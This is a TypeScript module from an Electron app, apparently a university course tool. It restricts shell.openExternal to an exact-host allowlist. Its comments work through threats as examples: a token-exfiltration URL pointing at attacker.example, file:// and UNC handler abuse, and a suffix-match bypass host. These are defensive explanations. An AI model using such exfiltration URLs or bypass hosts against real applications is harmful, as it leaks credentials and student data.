/**
 * Which URLs this app is willing to hand to the operating system.
 *
 * `shell.openExternal` launches whatever the platform has registered for a scheme, so an
 * unfiltered call is a general "run something" primitive: `file://` opens a local or UNC
 * executable, and Windows protocol handlers have a long history of turning that into remote code
 * execution. Filtering to http(s) closes that, and is where most Electron apps stop.
 *
 * This app goes further, because http(s) alone leaves a working exfiltration channel. CSP does
 * not govern top-level navigation, so script running in the renderer can navigate to
 * `https://attacker.example/?t=<canvas token>` and `will-navigate` would dutifully hand it to the
 * user's browser. The request completes; the data is gone. Opening a visible browser window makes
 * it conspicuous rather than silent, which is worth something — but "conspicuous" is not a
 * control, and the asset here is student data under FERPA.
 *
 * So the destination has to be one of the few this app actually has business opening: the Google
 * consent screen and the documents it creates, the Canvas instance the user configured, and this
 * app's own releases page. Anything else is dropped without opening anything.
 */

/**
 * Hosts that are always allowed, independent of how the app is configured.
 *
 * Every entry is somewhere the app actually links to. When adding a link to the interface, add
 * its host here at the same time — an allowlist miss is silent (the click does nothing at all),
 * so a missing entry does not announce itself. The test file enumerates every `href` in the
 * renderer and fails if one is not covered, which is what turns that silence into a red build.
 */
const STATIC_ALLOWED_HOSTS = new Set([
  // Google sign-in, and the documents the app creates or links to.
  'accounts.google.com',
  'docs.google.com',
  'drive.google.com',
  // Where the user gets a Gemini API key. Linked from Initial Setup and the Help Center.
  'aistudio.google.com',
  // Where a BoiseState.ai API key is made. Linked from Initial Setup.
  'boisestate.ai',
  // Instructure's public documentation — the Canvas token instructions cite it. This is not the
  // user's own Canvas instance; that is `canvasHost` below.
  'community.instructure.com',
  // This app's own releases page, for the update banner.
  'github.com',
  // The eCampus Help Center (Confluence), linked from the Help Center panel.
  'boisestateecampus.atlassian.net',
])

/**
 * The Canvas host the user configured, if any.
 *
 * Set from the stored course URL rather than hardcoded, because every institution has its own
 * Canvas domain. Null until a course URL has been saved, which is the correct default: before
 * then there is no Canvas host this app should be opening.
 */
let canvasHost: string | null = null

export function setAllowedCanvasHost(courseUrl: string | null): void {
  if (!courseUrl) {
    canvasHost = null
    return
  }
  try {
    const parsed = new URL(courseUrl)
    canvasHost = parsed.protocol === 'https:' ? parsed.host : null
  } catch {
    canvasHost = null
  }
}

/**
 * True when `url` is somewhere this app should be opening in the user's browser.
 *
 * Exact host matches only. A suffix check (`endsWith('.google.com')`) would accept
 * `google.com.attacker.example`, which is exactly the shape an exfiltration URL would take.
 */
export function isAllowedExternalUrl(url: string): boolean {
  let parsed: URL
  try {
    parsed = new URL(url)
  } catch {
    return false
  }
  if (parsed.protocol !== 'https:') return false
  if (STATIC_ALLOWED_HOSTS.has(parsed.host)) return true
  if (canvasHost !== null && parsed.host === canvasHost) return true
  return false
}
